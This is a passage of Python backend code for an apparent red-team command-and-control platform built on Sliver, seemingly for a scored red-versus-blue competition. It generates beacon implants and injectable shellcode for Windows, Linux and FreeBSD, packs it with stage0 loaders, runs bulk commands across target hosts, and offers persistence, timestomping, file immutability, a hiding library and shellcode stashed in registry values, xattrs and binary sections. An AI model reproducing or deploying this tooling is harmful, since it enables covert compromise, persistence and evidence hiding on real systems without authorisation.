                select(DevBeacon).where(DevBeacon.is_dead == False)  # noqa: E712
            ).scalars().all()
            ids = [r.id for r in rows]
            for r in rows:
                r.is_dead = True
            return ids

        killed_ids = await write_actor.submit(_kill_all_dev, label="kill_all_beacons_dev")
        from fastapi_backend.c2.sliver_manager import sliver_manager  # lazy-load
        for bid in killed_ids:
            await sliver_manager.publish({"type": "beacon-removed", "id": bid})
        return {"status": "ok", "killed": len(killed_ids), "ids": killed_ids}

    client = _get_sliver_client()
    beacons = await client.beacons()
    ids = [b.ID for b in beacons]

    now_iso = dt.datetime.now(dt.UTC).isoformat()

    def _record_kills(db: Session) -> None:
        for bid in ids:
            db.merge(PendingKills(
                session_id=bid,
                initiated_by=current_user.username,
                initiated_at=now_iso,
            ))

    await write_actor.submit(_record_kills, label="kill_all_beacons_pending")

    async def _kill_one(bid: str) -> tuple[str, bool, str]:
        try:
            await client.kill_beacon(bid)
            return (bid, True, "")
        except Exception as exc:
            logger.warning("kill_all_beacons: %s kill raised: %s", bid, exc)
            return (bid, False, str(exc)[:200])

    results = await asyncio.gather(*[_kill_one(bid) for bid in ids])
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break
    for bid, _, _ in results:
        await sliver_manager.publish({"type": "beacon-removed", "id": bid})

    return {
        "status": "ok",
        "killed": sum(1 for _, ok, _ in results if ok),
        "failed": sum(1 for _, ok, _ in results if not ok),
        "ids": ids,
    }


# ---------------------------------------------------------------------------
# Bulk exec — async route below.
# Legacy sync ``POST /c2/bulk/exec`` + ``BulkExecRequest`` removed in
# Phase 3 of the exec-merge plan.  Use ``POST /c2/bulk/exec/async`` for
# session/beacon/nxc fanout instead.
# ---------------------------------------------------------------------------


@router.post("/bulk/exec/async", status_code=202)
async def bulk_exec_async(
    body: "BulkExecAsyncRequest",
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Submit a bulk-exec job and return immediately with a task id.

    Per-box progress lives on the resulting OperatorTask row.  Frontend polls
    ``GET /c2/tasks/{task_id}``.  Concurrent submissions are rejected with
    ``409 another_bulk_exec_running``.
    """
    from fastapi_backend.c2.bulk_exec import (  # cycle-break
        CredBoxMismatchError,
        has_running_bulk_exec,
        resolve_creds_per_box,
        resolve_implants_per_box,
        run_bulk_exec_background,
    )

    if not body.target_boxes:
        raise HTTPException(status_code=422, detail="target_boxes must be non-empty")
    if not body.command.strip():
        raise HTTPException(status_code=422, detail="command must be non-empty")
    if body.method in {"session", "beacon"} and body.implant_name is None:
        raise HTTPException(status_code=422, detail=f"{body.method} method requires implant_name")
    if body.method == "nxc" and body.cred_type is None:
        raise HTTPException(status_code=422, detail="nxc method requires cred_type")

    if has_running_bulk_exec(operator=current_user.username):
        raise HTTPException(
            status_code=409,
            detail={"code": "another_bulk_exec_running"},
        )

    if body.method in {"session", "beacon"}:
        resolved = await resolve_implants_per_box(body.target_boxes, body.implant_name, body.method)
        missing = [ip for ip, impl in resolved.items() if impl is None]
        if missing and not body.confirm_missing:
            raise HTTPException(
                status_code=409,
                detail={
                    "code": "missing_implants",
                    "missing_boxes": missing,
                    "total_boxes": len(body.target_boxes),
                },
            )

    if body.method == "nxc":
        try:
            cred_map = resolve_creds_per_box(body.target_boxes, body.cred_type, body.cred_id)
        except CredBoxMismatchError as exc:
            raise HTTPException(status_code=422, detail=str(exc)) from exc
        missing_creds = [ip for ip, cred in cred_map.items() if cred is None]
        if missing_creds and not body.confirm_missing_creds:
            raise HTTPException(
                status_code=409,
                detail={
                    "code": "missing_creds",
                    "missing_boxes": missing_creds,
                    "total_boxes": len(body.target_boxes),
                },
            )

    task_id = create_task(
        task_type="bulk_exec",
        operator=current_user.username,
        team_num=None,
        target_boxes=body.target_boxes,
        metadata={
            "method": body.method,
            "command": body.command,
            "implant_name": body.implant_name,
            "cred_type": body.cred_type,
            "cred_id": body.cred_id,
            "per_box_timeout_sec": body.per_box_timeout_sec,
        },
    )
    register_background_task(
        task_id, fire_and_forget(run_cancellable(task_id, run_bulk_exec_background(body, task_id))),
    )
    return {"task_id": task_id, "status": "accepted"}


# ---------------------------------------------------------------------------
# Implant generation
# ---------------------------------------------------------------------------
# Implant generation — raw wire-format helpers
#
# sliver-py 0.0.19 was compiled against Sliver ~v1.5 protos whose ImplantConfig
# field numbers differ from the v1.7+ server (e.g. GOOS moved from field 5→7).
# We bypass sliver-py's protobuf objects entirely and build/parse wire bytes
# manually so the generate call works regardless of sliver-py version.
# ---------------------------------------------------------------------------

def _pb_varint(value: int) -> bytes:
    result = []
    while True:
        bits = value & 0x7F
        value >>= 7
        if value:
            result.append(0x80 | bits)
        else:
            result.append(bits)
            break
    return bytes(result)


def _pb_string(field: int, value: str) -> bytes:
    if not value:
        return b""
    b = value.encode()
    return _pb_varint((field << 3) | 2) + _pb_varint(len(b)) + b


def _pb_varint_field(field: int, value: int) -> bytes:
    if value == 0:
        return b""
    return _pb_varint((field << 3) | 0) + _pb_varint(value)


def _pb_message(field: int, msg_bytes: bytes) -> bytes:
    return _pb_varint((field << 3) | 2) + _pb_varint(len(msg_bytes)) + msg_bytes


# Serialise concurrent /c2/implants/generate calls — mutex extracted to
# c2/sliver_compile.py so core/payload_resolver.py can import it without
# creating a circular dependency through routes/c2.py.
from fastapi_backend.c2.sliver_compile import _serialized_sliver_compile  # noqa: E402


def _external_builder_for(goos: str, fmt_str: str) -> str:
    """Return the configured external-builder name for (goos, format), or "".

    Currently the only mapping is `linux + shared → EXTERNAL_BUILDER_SO_LINUX`.
    Empty string = no delegation → keep native build path. Adding a new
    delegation target (e.g. freebsd shared-lib) means adding a new config
    key + a new branch here, plus a corresponding builder container.

    See ``docker/sliver-build/README.md`` for the container that registers
    as the target builder for linux SHARED_LIB (ubuntu:18.04 / glibc 2.27).
    """
    if goos == "linux" and fmt_str == "shared" and config.EXTERNAL_BUILDER_SO_LINUX:
        return config.EXTERNAL_BUILDER_SO_LINUX
    return ""


def _build_implant_config_bytes(
    goos: str, goarch: str, fmt: int,
    is_beacon: bool, beacon_interval_ns: int, beacon_jitter_ns: int,
    c2_url: str, httpc2_name: str = "default",
    is_shared_lib: bool = False, exports: list[str] | None = None,
) -> bytes:
    """Serialize a bare ImplantConfig (no outer wrapper).

    Used by both ``_build_generate_req_bytes`` (native Generate RPC — wraps as
    GenerateReq.Config = field 1) and ``_build_external_generate_req_bytes``
    (external builder delegation — wraps as ExternalGenerateReq.Config = field
    1, alongside BuilderName = field 2).

    ImplantConfig fields (client.proto): IsBeacon=4, BeaconInterval=5,
    BeaconJitter=6, GOOS=7, GOARCH=8, C2=50 (ImplantC2: Priority=2, URL=3),
    Format=100, IsSharedLib=101, RunAtLoad=105, exports=107, HTTPC2ConfigName=150.

    Shared-lib builds (``.so``) need IsSharedLib + at least one export symbol or
    Sliver produces a library with no entry symbol (``nm -D --defined-only``
    empty → ``dlsym(..., "RunSliver")`` returns NULL → loader crash). Pass
    ``is_shared_lib=True, exports=["RunSliver"]`` for those. Fields 101/105/107
    are emitted ONLY when both ``is_shared_lib`` and ``fmt == SHARED_LIB`` — a
    caller passing ``is_shared_lib=True`` with an exe/service ``fmt`` injects
    nothing, so the fields can never leak onto a non-shared build (plan D8).
    """
    cfg = b""
    if is_beacon:
        cfg += _pb_varint_field(4, 1)
    cfg += _pb_varint_field(5, beacon_interval_ns)
    cfg += _pb_varint_field(6, beacon_jitter_ns)
    cfg += _pb_string(7, goos)
    cfg += _pb_string(8, goarch)
    c2_msg = _pb_varint_field(2, 0) + _pb_string(3, c2_url)  # ImplantC2
    cfg += _pb_message(50, c2_msg)
    cfg += _pb_varint_field(100, fmt)
    if is_shared_lib and fmt == _IMPLANT_FORMAT_MAP["shared"]:
        cfg += _pb_varint_field(101, 1)  # IsSharedLib = true
        cfg += _pb_varint_field(105, 1)  # RunAtLoad = true (Linux .init_array; no-op on FreeBSD)
        for sym in (exports or ["RunSliver"]):
            cfg += _pb_string(107, sym)  # exports (repeated string)
    cfg += _pb_string(150, httpc2_name)
    return cfg


def _build_generate_req_bytes(
    goos: str, goarch: str, fmt: int,
    is_beacon: bool, beacon_interval_ns: int, beacon_jitter_ns: int,
    c2_url: str, httpc2_name: str = "default",
    is_shared_lib: bool = False, exports: list[str] | None = None,
) -> bytes:
    """Serialize a GenerateReq for Sliver's native ``/rpcpb.SliverRPC/Generate``.

    Wraps the ImplantConfig as ``GenerateReq.Config`` (field 1). See
    ``_build_implant_config_bytes`` for the config fields themselves.
    """
    cfg = _build_implant_config_bytes(
        goos=goos, goarch=goarch, fmt=fmt,
        is_beacon=is_beacon,
        beacon_interval_ns=beacon_interval_ns,
        beacon_jitter_ns=beacon_jitter_ns,
        c2_url=c2_url, httpc2_name=httpc2_name,
        is_shared_lib=is_shared_lib, exports=exports,
    )
    return _pb_message(1, cfg)  # GenerateReq.Config


def _build_external_generate_req_bytes(
    builder_name: str,
    goos: str, goarch: str, fmt: int,
    is_beacon: bool, beacon_interval_ns: int, beacon_jitter_ns: int,
    c2_url: str, httpc2_name: str = "default",
    is_shared_lib: bool = False, exports: list[str] | None = None,
) -> bytes:
    """Serialize an ExternalGenerateReq for ``/rpcpb.SliverRPC/GenerateExternal``.

    Wire shape (server/rpc/rpc-generate.go / protobuf/clientpb/client.proto):
      ExternalGenerateReq { Config=1, BuilderName=2, Name=3 (optional) }
    We omit Name so the server auto-generates a codename (same as native path).
    """
    if not builder_name:
        raise ValueError("builder_name required for external generate request")
    cfg = _build_implant_config_bytes(
        goos=goos, goarch=goarch, fmt=fmt,
        is_beacon=is_beacon,
        beacon_interval_ns=beacon_interval_ns,
        beacon_jitter_ns=beacon_jitter_ns,
        c2_url=c2_url, httpc2_name=httpc2_name,
        is_shared_lib=is_shared_lib, exports=exports,
    )
    return _pb_message(1, cfg) + _pb_string(2, builder_name)


def _parse_generate_response(response_bytes: bytes) -> tuple[str, bytes]:
    """Extract (name, binary_data) from a raw Generate RPC response.

    Response structure: Generate { File=1 { Name=1 (string); Data=2 (bytes) } }
    Returns the Sliver codename (e.g. "LIVELY_FALCON") and the implant binary.
    """
    def _read_varint(buf: bytes, pos: int) -> tuple[int, int]:
        result = shift = 0
        while True:
            b = buf[pos]
            pos += 1
            result |= (b & 0x7F) << shift
            if not (b & 0x80):
                return result, pos
            shift += 7

    def _read_field(buf: bytes, pos: int) -> tuple[int, int, bytes | int, int]:
        tag, pos = _read_varint(buf, pos)
        wt = tag & 0x7
        if wt == 2:
            length, pos = _read_varint(buf, pos)
            return tag >> 3, wt, buf[pos:pos + length], pos + length
        if wt == 0:
            val, pos = _read_varint(buf, pos)
            return tag >> 3, wt, val, pos
        raise ValueError(f"Unsupported wire type {wt} at pos {pos}")

    pos = 0
    while pos < len(response_bytes):
        fn, wt, data, pos = _read_field(response_bytes, pos)
        if fn == 1 and wt == 2:  # Generate.File
            inner, ipos = bytes(data), 0
            sliver_name = ""
            binary_data: bytes | None = None
            while ipos < len(inner):
                ifn, iwt, idata, ipos = _read_field(inner, ipos)
                if ifn == 1 and iwt == 2:  # File.Name
                    sliver_name = bytes(idata).decode("utf-8", errors="replace")
                elif ifn == 2 and iwt == 2:  # File.Data
                    binary_data = bytes(idata)
            if binary_data is not None:
                return sliver_name, binary_data
    raise ValueError("Binary data not found in Generate response")


def _parse_external_config_response(response_bytes: bytes) -> tuple[str, str]:
    """Extract (build_id, sliver_name) from an ExternalImplantConfig response.

    Response shape (protobuf/clientpb/client.proto):
      ExternalImplantConfig { Config=1, Build=2, HTTPC2=3, encoders=4 }
      ImplantBuild { ID=1 (string), Name=2 (string), ... }

    Returned build_id is the DB row's UUID; sliver_name is the codename the
    builder + client both use to identify the pending build (matches what
    ``regenerate_implant(sliver_name)`` fetches once the container builder
    finishes and calls ``GenerateExternalSaveBuild``).
    """
    def _read_varint(buf: bytes, pos: int) -> tuple[int, int]:
        result = shift = 0
        while True:
            b = buf[pos]; pos += 1
            result |= (b & 0x7F) << shift
            if not (b & 0x80):
                return result, pos
            shift += 7

    def _read_field(buf: bytes, pos: int) -> tuple[int, int, bytes | int, int]:
        tag, pos = _read_varint(buf, pos)
        wt = tag & 0x7
        if wt == 2:
            length, pos = _read_varint(buf, pos)
            return tag >> 3, wt, buf[pos:pos + length], pos + length
        if wt == 0:
            val, pos = _read_varint(buf, pos)
            return tag >> 3, wt, val, pos
        raise ValueError(f"Unsupported wire type {wt} at pos {pos}")

    pos = 0
    while pos < len(response_bytes):
        fn, wt, data, pos = _read_field(response_bytes, pos)
        if fn == 2 and wt == 2:  # ExternalImplantConfig.Build
            inner, ipos = bytes(data), 0
            build_id = ""
            sliver_name = ""
            while ipos < len(inner):
                ifn, iwt, idata, ipos = _read_field(inner, ipos)
                if ifn == 1 and iwt == 2:  # ImplantBuild.ID
                    build_id = bytes(idata).decode("utf-8", errors="replace")
                elif ifn == 2 and iwt == 2:  # ImplantBuild.Name
                    sliver_name = bytes(idata).decode("utf-8", errors="replace")
            if build_id and sliver_name:
                return build_id, sliver_name
    raise ValueError("Build ID/Name not found in ExternalImplantConfig response")


async def _await_external_build_bytes(
    client: Any, sliver_name: str,
    poll_interval_s: float = 3.0, timeout_s: int = 600,
) -> bytes:
    """Poll Sliver for the finished external-build binary and return its bytes.

    External-build flow (server/rpc/rpc-generate.go):
      1. Client calls GenerateExternal — server publishes ExternalBuildEvent,
         creates the pending ImplantBuild row with a codename, returns
         immediately (before compile).
      2. Registered builder receives the event over its BuilderRegister stream,
         calls GenerateExternalGetBuildConfig, compiles the artifact, then
         calls GenerateExternalSaveBuild with the bytes — server writes them
         to ``builds/<build_id>`` and updates ``implant_builds`` (MD5 etc.).
      3. Any client can then call Regenerate(sliver_name) to fetch the bytes.

    We poll Regenerate rather than sniff Sliver's on-disk build dir so this
    stays root-free and works even when Sliver's state is remote. Regenerate
    errors with a generic gRPC error while the build is still compiling;
    treat that as "keep waiting" until the deadline.
    """
    import time as _t
    deadline = _t.monotonic() + timeout_s
    last_err: str | None = None
    while _t.monotonic() < deadline:
        try:
            gen = await client.regenerate_implant(sliver_name, timeout=30)
            if gen and getattr(gen, "File", None) and gen.File.Data:
                return bytes(gen.File.Data)
        except grpc.aio.AioRpcError as exc:
            last_err = f"{exc.code().name}: {exc.details()}"
        except Exception as exc:  # noqa: BLE001 — poll-through-all-errors is the point
            last_err = f"{type(exc).__name__}: {exc}"
        await asyncio.sleep(poll_interval_s)
    raise TimeoutError(
        f"external build {sliver_name} did not complete within {timeout_s}s"
        + (f" (last: {last_err})" if last_err else "")
    )


async def _generate_inject_shellcode(
    c2_url: str,
    beacon_interval_s: int = 10,
    beacon_jitter_s: int = 5,
    goos: str = "windows",
    is_beacon: bool = True,
) -> bytes:
    """Generate a fresh beacon in Sliver-native shellcode format for ``goos``.

    Uses the same raw gRPC wire-format path as _generate_implant_binary_inner so
    the resulting binary has a fresh cert registered with the server — avoiding
    the stale-cert rejection that happens when shellcode_win.bin was built from
    a beacon whose cert has since been cleaned from /root/.sliver/sliver.db.

    ``goos`` defaults to "windows" so the pre-existing callers (session-inject,
    pivot winlansvc DLL) keep their behaviour.  "linux" is also supported —
    verified against the live server, which builds linux/amd64 shellcode fine.

    **FreeBSD**: Sliver does not support a native ``shellcode`` format for
    freebsd/amd64.  Instead we generate a ``shared`` (.so) implant and pass
    it through ``scripts/build/stage0_freebsd_pack.py`` to produce a
    stage0 + patched-.so blob that ``self_inject_freebsd`` can inject via
    ptrace (docs/PLAN_self_inject_shellcode_baking.md §5 / §6 D3).

    Returns raw shellcode bytes. Raises RuntimeError on failure (caller decides
    whether to fall back to the static file or hard-fail).
    """
    if goos == "freebsd":
        return await _generate_freebsd_shellcode(
            c2_url,
            beacon_interval_s=beacon_interval_s,
            beacon_jitter_s=beacon_jitter_s,
        )

    if goos == "linux":
        return await _generate_linux_shellcode(
            c2_url,
            beacon_interval_s=beacon_interval_s,
            beacon_jitter_s=beacon_jitter_s,
        )

    client = _get_sliver_client()
    if client is None:
        raise RuntimeError("Sliver client not available")

    req_bytes = _build_generate_req_bytes(
        goos=goos,
        goarch="amd64",
        fmt=_IMPLANT_FORMAT_MAP["shellcode"],  # SHELLCODE = 1
        # is_beacon is a parameter because a TCPPIVOT implant MUST be a session:
        # Sliver's pivots "can only be used in 'session mode'" (BishopFox wiki,
        # Pivots), and a beacon built for tcppivot:// does not merely fail to
        # register — it busy-loops at ~99% CPU on the target forever with no
        # socket ever opened (measured on 3 boxes, 2026-08-09). Beacon stays the
        # default so the mTLS self-inject callers are unchanged.
        is_beacon=is_beacon,
        # Short interval so first check-in lands well within the 120s test
        # window even after sRDI loader + Go runtime startup (~10-20s).
        # 60s + 30s jitter + startup routinely exceeds 120s. Ignored by Sliver
        # for a session build.
        beacon_interval_ns=beacon_interval_s * 1_000_000_000,
        beacon_jitter_ns=beacon_jitter_s * 1_000_000_000,
        c2_url=c2_url,
    )
    generate_raw = client._channel.unary_unary(
        "/rpcpb.SliverRPC/Generate",
        request_serializer=lambda x: x,
        response_deserializer=lambda x: x,
    )
    try:
        response_bytes, _ = await _serialized_sliver_compile(generate_raw, req_bytes)
    except TimeoutError as exc:
        raise RuntimeError("shellcode generate timed out (>12 min)") from exc
    except Exception as exc:
        raise RuntimeError(f"shellcode generate gRPC error: {exc}") from exc

    _, shellcode_bytes = _parse_generate_response(response_bytes)
    return shellcode_bytes


async def _generate_freebsd_shellcode(
    c2_url: str,
    beacon_interval_s: int = 10,
    beacon_jitter_s: int = 5,
) -> bytes:
    """Generate FreeBSD shellcode blob via:
      1. Sliver freebsd/amd64/shared beacon (.so)
      2. stage0_freebsd_pack.py --no-patch: prepend stage0_freebsd.bin (no ELF surgery)

    stage0 uses shm_open2(SHM_ANON)+dlopen via the target's libc; no PT_INTERP/entry stub needed.
    Returns the packed blob (stage0 || raw-.so).
    Raises RuntimeError on any failure.
    """
    import subprocess as _subprocess  # lazy-load
    import tempfile as _tempfile  # lazy-load

    client = _get_sliver_client()
    if client is None:
        raise RuntimeError("Sliver client not available")

    req_bytes = _build_generate_req_bytes(
        goos="freebsd",
        goarch="amd64",
        fmt=_IMPLANT_FORMAT_MAP["shared"],  # SHARED_LIB
        is_beacon=True,
        beacon_interval_ns=beacon_interval_s * 1_000_000_000,
        beacon_jitter_ns=beacon_jitter_s * 1_000_000_000,
        c2_url=c2_url,
        # Emit IsSharedLib+exports so the .so exports RunSliver.
        # stage0 dlopen's the raw .so (--no-patch) and calls RunSliver directly.
        is_shared_lib=True,
        exports=["RunSliver"],
    )
    generate_raw = client._channel.unary_unary(
        "/rpcpb.SliverRPC/Generate",
        request_serializer=lambda x: x,
        response_deserializer=lambda x: x,
    )
    try:
        response_bytes, _ = await _serialized_sliver_compile(generate_raw, req_bytes)
    except TimeoutError as exc:
        raise RuntimeError("freebsd shared-lib generate timed out (>12 min)") from exc
    except Exception as exc:
        raise RuntimeError(f"freebsd shared-lib generate gRPC error: {exc}") from exc

    _, so_bytes = _parse_generate_response(response_bytes)
    if not so_bytes:
        raise RuntimeError("Sliver returned empty bytes for freebsd/amd64/shared")

    project_root = Path(config.PROJECT_ROOT)
    stage0_blob = project_root / "iocs" / "payloads" / "stage0_freebsd.bin"
    if not stage0_blob.exists():
        raise RuntimeError(
            f"stage0_freebsd.bin not found at {stage0_blob}; "
            "run scripts/build/build_stage0_freebsd.sh first"
        )

    packer_script = project_root / "scripts" / "build" / "stage0_freebsd_pack.py"

    with _tempfile.TemporaryDirectory(prefix="c3r_fbsd_sc_") as tmpdir:
        so_path  = Path(tmpdir) / "implant.so"
        out_path = Path(tmpdir) / "shellcode_freebsd.bin"
        so_path.write_bytes(so_bytes)

        result = await asyncio.to_thread(
            _subprocess.run,
            [
                "python3", str(packer_script),
                "--so",     str(so_path),
                "--stage0", str(stage0_blob),
                "--out",    str(out_path),
                "--no-patch",  # stage0 now uses shm_open2+dlopen; no ELF surgery needed
            ],
            capture_output=True, text=True,
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"stage0_freebsd_pack.py failed (rc={result.returncode}): "
                f"{result.stderr.strip() or result.stdout.strip()}"
            )

        logger.info(
            "_generate_freebsd_shellcode: packed %d so_bytes → %d blob bytes\n%s",
            len(so_bytes), out_path.stat().st_size, result.stdout.strip(),
        )
        return out_path.read_bytes()


async def _generate_linux_shellcode(
    c2_url: str,
    beacon_interval_s: int = 10,
    beacon_jitter_s: int = 5,
) -> bytes:
    """Generate Linux shellcode blob via:
      1. Sliver linux/amd64/shared beacon (.so)
      2. stage0_linux_pack.py: patch .so + prepend stage0_linux.bin

    Mirrors _generate_freebsd_shellcode exactly — same approach, Linux constants.
    Returns the packed blob (stage0 || patched-.so).
    Raises RuntimeError on any failure.
    """
    import subprocess as _subprocess  # lazy-load
    import tempfile as _tempfile  # lazy-load

    client = _get_sliver_client()
    if client is None:
        raise RuntimeError("Sliver client not available")

    req_bytes = _build_generate_req_bytes(
        goos="linux",
        goarch="amd64",
        fmt=_IMPLANT_FORMAT_MAP["shared"],  # SHARED_LIB
        is_beacon=True,
        beacon_interval_ns=beacon_interval_s * 1_000_000_000,
        beacon_jitter_ns=beacon_jitter_s * 1_000_000_000,
        c2_url=c2_url,
        is_shared_lib=True,
        exports=["RunSliver"],
    )
    generate_raw = client._channel.unary_unary(
        "/rpcpb.SliverRPC/Generate",
        request_serializer=lambda x: x,
        response_deserializer=lambda x: x,
    )
    try:
        response_bytes, _ = await _serialized_sliver_compile(generate_raw, req_bytes)
    except TimeoutError as exc:
        raise RuntimeError("linux shared-lib generate timed out (>12 min)") from exc
    except Exception as exc:
        raise RuntimeError(f"linux shared-lib generate gRPC error: {exc}") from exc

    _, so_bytes = _parse_generate_response(response_bytes)
    if not so_bytes:
        raise RuntimeError("Sliver returned empty bytes for linux/amd64/shared")

    project_root = Path(config.PROJECT_ROOT)
    stage0_blob = project_root / "iocs" / "payloads" / "stage0_linux.bin"
    if not stage0_blob.exists():
        raise RuntimeError(
            f"stage0_linux.bin not found at {stage0_blob}; "
            "run scripts/build/build_stage0_linux.sh first"
        )

    packer_script = project_root / "scripts" / "build" / "stage0_linux_pack.py"

    with _tempfile.TemporaryDirectory(prefix="c3r_lnx_sc_") as tmpdir:
        so_path  = Path(tmpdir) / "implant.so"
        out_path = Path(tmpdir) / "shellcode_linux.bin"
        so_path.write_bytes(so_bytes)

        result = await asyncio.to_thread(
            _subprocess.run,
            [
                "python3", str(packer_script),
                "--so",     str(so_path),
                "--stage0", str(stage0_blob),
                "--out",    str(out_path),
                "--no-patch",  # stage0 now uses memfd+dlopen; no ELF surgery needed
            ],
            capture_output=True, text=True,
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"stage0_linux_pack.py failed (rc={result.returncode}): "
                f"{result.stderr.strip() or result.stdout.strip()}"
            )

        logger.info(
            "_generate_linux_shellcode: packed %d so_bytes → %d blob bytes\n%s",
            len(so_bytes), out_path.stat().st_size, result.stdout.strip(),
        )
        return out_path.read_bytes()


# ---------------------------------------------------------------------------
# Implant generation helpers
# ---------------------------------------------------------------------------

TCPPIVOT_SCHEME = "tcppivot://"


def _reject_beacon_over_pivot(is_beacon: bool, c2_url: str | None) -> None:
    """Refuse to build a BEACON whose C2 endpoint is a TCP pivot.

    Sliver's pivots "can only be used in 'session mode' (we may add beacon
    support later)" — BishopFox/sliver wiki, Pivots. The whole pivot protocol is
    session-keyed: PivotPeerEnvelope carries a PivotSessionID, PivotGraphEntry
    holds a Session, and there is no beacon equivalent for either.

    This is a hard error rather than a warning because the failure mode is silent
    AND expensive. A beacon built against tcppivot:// compiles, deploys, and runs
    — then busy-loops at ~99% CPU on the target forever without ever opening a
    socket. Nothing surfaces: no implant appears in any listing, so the box looks
    idle while a core is pinned. Measured 2026-08-09 across 3 boxes; 10 such
    members were built and 0 ever registered, while an otherwise identical
    session over the SAME pivot URL connected immediately.
    """
    if is_beacon and (c2_url or "").lower().startswith(TCPPIVOT_SCHEME):
        raise HTTPException(
            status_code=400,
            detail=(
                "Sliver pivots are session-only: a beacon cannot connect through a "
                "TCP pivot. Set is_beacon=false for this implant. (A tcppivot beacon "
                "does not fail loudly — it spins at ~99% CPU on the target and never "
                "calls back.)"
            ),
        )


class ImplantGenerateRequest(BaseModel):
    """POST /c2/implants/generate request body — implant build parameters."""

    os: str                          # "windows", "linux", "freebsd"
    arch: str = "amd64"
    format: str = "exe"              # "exe", "shared", "shellcode", "service"
    is_beacon: bool  # required — no default; beacon vs session must be explicit
    beacon_interval: int = 60        # seconds
    c2_url: str
    implant_name: str | None = None
    deploy_targets: list[str] = []
    cred_id: int | None = None
    pivot_team_nums: list[int] | None = None  # set to trigger pivot 3-implant generation (one set per team)
    # Port the TCP pivot listener binds on pfSense. None → backend allocates
    # per-team via PIVOT_LISTENER_PORT_BASE + team_num so concurrent pivots
    # don't collide on a single port.
    tcp_pivot_port: int | None = None

    # ── Phase A composable persistence + immutability + auto-register ────
    # `persistence_name` is the module-attr name of an
    # iocs.persistence.PersistenceMechanism (e.g. "WindowsAttribIcacls").
    # In pivot mode use `persistence_tier_group` instead — the post-deploy
    # hook resolves the tier per box's OS via by_tier_group().
    persistence_name: str | None = None
    persistence_tier_group: str | None = None        # "scheduled"|"service"|"event" (pivot only)
    apply_immutable: bool = False                    # chattr+i / attrib+icacls after deploy
    immutable_scope: str = "binary_only"             # "binary_only" | "binary_and_persistence"
    # Retained for back-compat; registration of a DEPLOYED implant is mandatory
    # (a False value is ignored on the deploy path). See PLAN_implant_auto_register.md.
    auto_register: bool = True
    auto_register_ioc_name: str | None = None        # IOC label for the DeployedIOCs.ioc_name column
    # When true, timestomp the deployed implant binary to match a sibling
    # file in its drop directory.  Runs before any immutable-application
    # step (chattr +i blocks subsequent touch).  Failures are non-fatal;
    # outcome lands in OperatorTask.metadata_json.timestomp.
    timestomp: bool = False

    # ── Backup-copy persistence (PLAN_backup_copy_persistence.md) ─────────
    # None = defer to ioc.backup_copy; True/False = operator override.
    # Disabled automatically when storage_mode is self_inject* (no file).
    backup_copy_enabled: bool | None = None

    # Route cred selection for the NXC-side deploy path (put_file + persistence
    # apply) through the scoring identity instead of operator creds. Default
    # False preserves operator-generate behaviour (docs/PLAN_operator_ux.md §C).
    # deploy_all sets True so IOC implant deploys authenticate as red_scoring
    # (uid 0 / Administrators) — the only account guaranteed to write to
    # privileged deploy dirs like /usr/lib on ranges where the operator login
    # is a non-root wheel user (e.g. testing_inventory blackteam). Ignored when
    # RED_SCORING_ENABLED=False (falls back to the legacy operator pick).
    use_scoring_cred: bool = False

    # ── Resilient implant storage mode (PLAN_resilient_implant_iocs.md) ───
    # Selects the generate-page IOC family for this build:
    #   "file"              – standard on-disk implant binary (default)
    #   "registry"          – shellcode stored in HKLM registry value (Windows)
    #   "pe_section"        – shellcode in .c3r_sc PE section of carrier EXE (Windows)
    #   "xattr"             – shellcode in user.c3r_sc xattr on /etc/hosts (Linux)
    #   "elf_section"       – shellcode in .c3r_sc ELF section of carrier binary (Linux/pfSense)
    #   "extattr"           – shellcode in extattr on /etc/hosts (pfSense/FreeBSD)
    #   "self_inject"       – dropper: inject shellcode into host process, self-delete
    #   "self_inject_persist" – dropper + event-driven persistence (udev/WMI/devd)
    storage_mode: str = "file"
    # Persistence mechanism for "self_inject_persist" mode:
    #   "wmi" (Windows), "udev" (Linux), "devd" (pfSense)
    inject_persist_type: str | None = None

    # When true, insert HidingLibraryConfig entries for the deployed binary
    # (and persistence mechanism if selected) and push the updated XOR-encrypted
    # config blob to the target box so the hiding library conceals the implant.
    # No-op when deploy_targets is empty (no box to push to).
    enable_hiding: bool = False

    # Frontend-computed 1..4 difficulty tier for the auto-registered DeployedIOCs
    # row (Generate-page auto-difficulty badge; docs/PLAN_generate_page_labels_
    # autodifficulty.md).  None -> fall back to IOCDefinition.difficulty.  Only
    # consumed on the INSERT path; existing DeployedIOCs rows are never rewritten
    # from here (blue-team scoring correctness).
    computed_difficulty: int | None = None


_IMPLANT_FORMAT_MAP = {
    "exe": 2,       # EXECUTABLE = 2
    "shared": 0,    # SHARED_LIB = 0 (server default — explicit name avoids confusion)
    "shellcode": 1, # SHELLCODE = 1
    "service": 3,   # SERVICE = 3
}


# Post-deploy operations extracted to core/implant_ops.py to break the import
# chain with core/payload_resolver.py.  Re-exported here for backward-compat
# with existing test imports from fastapi_backend.routes.c2.
from fastapi_backend.core.implant_ops import (  # noqa: E402
    _apply_immutability_to_path,  # noqa: F401 — re-exported for test_implant_persistence_apply
    _apply_persistence_post_deploy,
    persistence_step_failed,
)


async def _auto_register_deployed_ioc(
    *,
    box_ip: str,
    ioc_name: str | None,
    persistence_name: str | None,
    implant_identifier: str | None,
    deployed_by: str,
    deploy_params: dict[str, str] | None = None,
    computed_difficulty: int | None = None,
) -> int | None:
    """Upsert the DeployedIOCs row for an auto-deployed implant.

    Returns the row id or None on failure.  Never raises.

    **Per-location scoring, not per-deploy**: an active row for the same
    (box, ioc) at the SAME recorded DROP_DIR — or one with no DROP_DIR recorded
    at all, which is what ``sliver_manager._auto_register_implant`` writes when a
    session checks in before this eager path runs — is UPDATED in place. Only a
    genuinely different DROP_DIR earns a second row. Inserting unconditionally
    produced duplicate active rows (two scoring units for one artifact), and the
    partial unique index can't catch it because SQLite treats NULL
    ``json_extract(deploy_params,'$.DROP_DIR')`` values as distinct.
    """
    if not ioc_name:
        return None
    try:
        new_dir = (deploy_params or {}).get("DROP_DIR")

        def _register(db: Session) -> tuple[int, bool]:
            existing = db.execute(
                select(DeployedIOCs).where(
                    DeployedIOCs.box_ip == box_ip,
                    DeployedIOCs.ioc_name == ioc_name,
                    DeployedIOCs.status == "active",
                ).order_by(DeployedIOCs.id.asc())
            ).scalars().all()
            match = next(
                (
                    r for r in existing
                    if r.params_dict.get("DROP_DIR") in (None, new_dir)
                ),
